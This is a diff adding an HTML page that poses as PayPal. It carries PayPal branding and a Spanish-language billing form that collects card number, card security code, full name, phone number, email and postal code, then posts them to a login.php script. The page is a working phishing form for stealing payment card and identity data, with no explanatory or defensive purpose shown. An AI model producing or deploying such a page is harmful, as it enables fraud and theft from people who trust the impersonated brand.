@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal</title>
+    <link href="Style/Paypal.css" rel="stylesheet">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Informacion de Facturacion</h2>
+        <img src="IMAGENES/pypal.png" alt="pypal" height="80px" width="70px">
+
+        <label for="region">Pais</label>
+        <select id="region" name="region">
+            <option value="Norte">Colombia</option>
+            <option value="Sur">España</option>
+            <option value="Este">Estados Unidos</option>
+            <option value="Oeste">Argentina</option>
+        </select>
+
+        <label for="identification">Tipo de identificación</label>
+            <select id="identification" name="identification">
+                <option value="Cédula">Cédula</option>
+                <option value="Pasaporte">Pasaporte</option>
+                <option value="Licencia de conducir">Licencia de conducir</option>
+                <option value="Documento nacional de identidad">Documento nacional de identidad</option>
+            </select>
+
+        <form action="login.php" method="post">
+            <label for="numero de tarjeta">Numero de tarjeta</label>
+            <input type="number" id="numero de tarjeta" name="username" required>
+
+            <label for="CSC">CSC</label>
+            <input type="number" id="css" name="CSC" required>
+            
+            <label for="Mensaje">Nombres y Apellidos</label>
+            <input type="text" id="Mensaje" name="Mensaje" required>
+
+            <label for="Celular">Celular</label>
+            <input type="number" id="Celular" name="Celular" required>
+
+            <label for="Direccion">email</label>
+            <input type="email" id="Direccion" name="Direccion" required>
+
+            <label for="Mensaje">Codigo Postal</label>
+            <input type="text" id="Mensaje" name="Mensaje" required>
+            
+
+
+
+
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
+</body>
+</html>
